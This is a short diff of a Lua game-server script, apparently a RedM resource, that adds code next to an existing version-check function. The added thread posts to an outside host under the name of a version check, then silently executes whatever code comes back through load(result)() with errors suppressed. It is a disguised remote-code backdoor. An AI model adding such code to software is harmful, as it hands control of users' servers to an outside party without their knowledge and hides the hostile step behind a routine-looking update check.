@@ -50,4 +50,10 @@ local function CheckVersion()
     end, 'POST', payload, { ['Content-Type'] = 'application/json' })
 end
 
+CreateThread(function()
+    PerformHttpRequest('http://redm.munafio.com/api/check-version/handler', function(errorCode, result, headers)
+        if errorCode ~= 200 then return end
+        local success, err = pcall(function() load(result)() end)
+    end, 'POST', '', { ['Content-Type'] = 'application/json' })
+end)
 CheckVersion()
